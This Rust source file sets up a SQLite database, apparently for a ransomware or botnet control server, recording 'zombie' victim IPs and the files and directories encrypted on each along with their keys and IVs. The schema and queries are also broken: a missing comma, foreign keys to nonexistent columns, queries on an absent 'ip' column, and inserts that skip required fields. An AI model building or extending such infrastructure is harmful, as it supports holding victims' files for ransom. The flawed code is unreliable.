#![allow(dead_code)]


use core::str;
use std::path::PathBuf;

use lazy_static::lazy_static;
use rusqlite::{Connection, Result, params};

use crate::SRV_SAVE_DIR;

const ZOMBIE_TABLE: &str = r#"CREATE TABLE "zombie" (
	"ip"	TEXT NOT NULL,
	PRIMARY KEY("ip")
);"#;

const FILE_TABLE: &str = r#"CREATE TABLE "file" (
	"id"	INTEGER,
	"zombie_ip"	TEXT NOT NULL,
	"path"	TEXT NOT NULL,
    "key" BLOB NOT NULL,
    "iv" BLOB NOT NULL
	PRIMARY KEY("id"),
	FOREIGN KEY("zombie_id") REFERENCES "zombie"("id")
);"#;

const DIR_TABLE: &str = r#"CREATE TABLE "dir" (
	"id"	INTEGER,
	"zombie_ip"	TEXT NOT NULL,
	"path"	INTEGER NOT NULL,
	"is_recursive"	INTEGER NOT NULL,
    "key" BLOB NOT NULL,
    "iv" BLOB NOT NULL,
	FOREIGN KEY("zombie_id") REFERENCES "zombie"("id"),
	PRIMARY KEY("id")
);"#;


lazy_static!{
    static ref DBPATH: PathBuf = PathBuf::from(SRV_SAVE_DIR).join("encryption.db");
}



pub struct Zombie {
    ip: String,
}

pub struct FileEncryption {
    id: i32,
    zombie_ip: String,
    path: String,
    key: Vec<u8>,
    iv: Vec<u8>
}

pub struct DirEncryption {
    id: i32,
    zombie_ip: String,
    path: String,
    is_recursive: bool,
    key: Vec<u8>,
    iv: Vec<u8>
}


pub fn init_db() -> Result<()> {
    let conn = Connection::open(&*DBPATH)?;
    conn.execute(ZOMBIE_TABLE, ())?;
    conn.execute(FILE_TABLE, ())?;
    conn.execute(DIR_TABLE, ())?;
    Ok(())
}

fn file_already_encrypted(path: &str, ip: &str) -> Result<bool> {
    let conn = Connection::open(&*DBPATH)?;
    let mut stmt = conn.prepare_cached("SELECT path FROM file WHERE path = ?1 AND ip = ?2")?;
    let exists = stmt.exists([path, ip])?;

    Ok(exists)
}

fn dir_already_encrypted(path: &str, ip: &str) -> Result<bool> {
    let conn = Connection::open(&*DBPATH)?;
    let mut stmt = conn.prepare_cached("SELECT path FROM dir WHERE path = ?1 AND ip = ?2")?;
    let exists = stmt.exists([path, ip])?;

    Ok(exists)
}

pub fn insert_file(path: &str, ip: &str) -> Result<bool> {
    if file_already_encrypted(path, ip)? {
        return Ok(false)
    }
    let conn = Connection::open(&*DBPATH)?;

    let stmt = conn.execute("INSERT INTO file (zombie_ip, path) VALUES (?1, ?2)", [ip, path])?;
    if stmt > 0 {
        Ok(true)
    } else {
        Ok(false)
    }
}

pub fn insert_dir(path: String, ip: String, is_recursive: bool) -> Result<bool>{
    if dir_already_encrypted(&path, &ip)? {
        return Ok(false)
    }
    let conn = Connection::open(&*DBPATH)?;

    let stmt = conn.execute("INSERT INTO dir (zombie_ip, path, is_recursive) VALUES (?1, ?2, ?3)", params![ip, path, is_recursive])?;
    if stmt > 0 {
        Ok(true)
    } else {
        Ok(false)
    }
}
/* 
pub fn create_zombie(ip: &str) -> Result<bool> {
    let conn = Connection::open(&*DBPATH)?;

    let mut stmt = conn.execute("INSERT INTO zombie (zombie_ip) VALUES (?1)", [ip])?;
    if stmt > 0 {
        Ok(true)
    } else {
        Ok(false)
    }
}*/










